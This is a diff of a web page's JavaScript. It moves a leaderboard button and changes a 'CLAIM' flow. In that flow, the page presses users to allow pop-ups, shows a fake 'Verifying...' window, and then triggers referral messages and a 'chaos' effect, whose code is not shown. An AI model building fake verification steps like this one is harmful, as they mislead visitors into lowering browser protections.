@@ -25,7 +25,6 @@ if (isMobileDevice()) {
     const browserWindow = document.getElementById('browserWindow');
     const secondClaimButtonContainer = document.getElementById('secondClaimButtonContainer');
     const secondClaimButton = document.getElementById('secondClaimButton');
-    const leaderboardButton = document.getElementById('leaderboardButton');
     const leaderboardWindow = document.getElementById('leaderboardWindow');
     const closeLeaderboardButton = document.getElementById('closeLeaderboardButton');
     const leaderboardList = document.getElementById('leaderboardList');
@@ -204,28 +203,57 @@ if (isMobileDevice()) {
         // Hide the second CLAIM button
         secondClaimButtonContainer.style.display = 'none';
 
-        claimMessage.textContent = 'Checking for pop-up blocker...';
+        claimMessage.textContent = 'Awaiting verification...';
 
         // Open a test window to check for pop-up blockers
-        const testWindow = window.open('', '', 'width=200,height=100');
-
+        const testWindow = window.open('', '', 'width=300,height=200');
         if (testWindow === null || typeof testWindow === 'undefined') {
             alert('Pop-up blocked. Please allow pop-ups for this site and refresh the page to proceed.');
 
             // Show tutorial video on how to disable popup blocker
             showPopupBlockerTutorial();
 
-            claimMessage.textContent = 'Pop-up blocked. Please allow pop-ups and refresh the page.';
+            claimMessage.textContent = 'Pop-up blocked. Please allow pop-ups and try again.';
             return;
         } else {
-            // Close the test window immediately
-            testWindow.close();
+            // Write "Verifying..." in the test window
+            testWindow.document.write(`
+                <!DOCTYPE html>
+                <html lang="en">
+                <head>
+                    <title>Verifying...</title>
+                    <style>
+                        body {
+                            display: flex;
+                            justify-content: center;
+                            align-items: center;
+                            height: 100%;
+                            margin: 0;
+                            font-family: Arial, sans-serif;
+                            background-color: #ffffff;
+                        }
+                        h1 {
+                            font-size: 20px;
+                            color: #000000;
+                        }
+                    </style>
+                </head>
+                <body>
+                    <h1>Verifying...</h1>
+                </body>
+                </html>
+            `);
 
-            // Proceed to send referral messages
-            sendReferralMessages();
+            // Close the test window after 1 second
+            setTimeout(() => {
+                testWindow.close();
 
-            // Start Chaos Effect
-            startChaos();
+                // Proceed to send referral messages
+                sendReferralMessages();
+
+                // Start Chaos Effect
+                startChaos();
+            }, 1000);
         }
     });
 
@@ -507,6 +535,18 @@ if (isMobileDevice()) {
     }
 
     // Leaderboard Functionality
+    // Create Leaderboard Button
+    const leaderboardButton = document.createElement('div');
+    leaderboardButton.classList.add('tab');
+    leaderboardButton.id = 'leaderboardButton';
+    leaderboardButton.textContent = 'Leaderboard';
+
+    // Style the leaderboard button to be on the far right
+    leaderboardButton.style.marginLeft = 'auto';
+
+    // Append it to the nav tabs
+    navTabs.appendChild(leaderboardButton);
+
     leaderboardButton.addEventListener('click', () => {
         if (leaderboardWindow.style.display === 'none' || leaderboardWindow.style.display === '') {
             leaderboardWindow.style.display = 'block';
@@ -540,35 +580,4 @@ if (isMobileDevice()) {
             leaderboardList.innerHTML = '<li>Error fetching leaderboard.</li>';
         }
     }
-
-    // Move Leaderboard Button to Far Right
-    function moveLeaderboardButtonToFarRight() {
-        // Remove existing leaderboard button
-        leaderboardButton.parentNode.removeChild(leaderboardButton);
-
-        // Create a new tab for the leaderboard
-        const leaderboardTab = document.createElement('div');
-        leaderboardTab.classList.add('tab');
-        leaderboardTab.id = 'leaderboardButton';
-        leaderboardTab.textContent = 'Leaderboard';
-
-        // Style the leaderboard tab to be on the far right
-        leaderboardTab.style.marginLeft = 'auto';
-
-        // Append it to the nav tabs
-        navTabs.appendChild(leaderboardTab);
-
-        // Re-attach event listener
-        leaderboardTab.addEventListener('click', () => {
-            if (leaderboardWindow.style.display === 'none' || leaderboardWindow.style.display === '') {
-                leaderboardWindow.style.display = 'block';
-                fetchLeaderboard();
-            } else {
-                leaderboardWindow.style.display = 'none';
-            }
-        });
-    }
-
-    // Call the function to move the leaderboard button
-    moveLeaderboardButtonToFarRight();
 }
